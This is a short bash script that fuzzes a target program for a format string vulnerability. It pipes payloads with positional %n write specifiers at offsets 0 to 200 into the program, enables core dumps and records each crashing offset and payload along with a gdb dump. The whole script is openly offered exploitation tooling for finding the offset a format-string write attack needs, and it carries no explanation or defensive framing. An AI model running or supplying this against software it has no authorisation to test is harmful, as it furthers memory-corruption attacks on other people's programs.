#!/bin/bash
handler()
{
    kill -s SIGINT $PID
}
ulimit -c unlimited

i=0
while [ $i -le 200 ]
do
    trap handler SIGINT
    echo -ne "$1%$i\$n$2" | $3 > /dev/null
    if [[ $? -gt 0 ]]
    then
      echo -ne "[+] OFFSET : $i\n[+] PAYLOAD $1%$i\$n$2\n"
      echo "q" | gdb --core=core -q > $i.txt
      mv core $i.core
    fi
    ((i++))
done

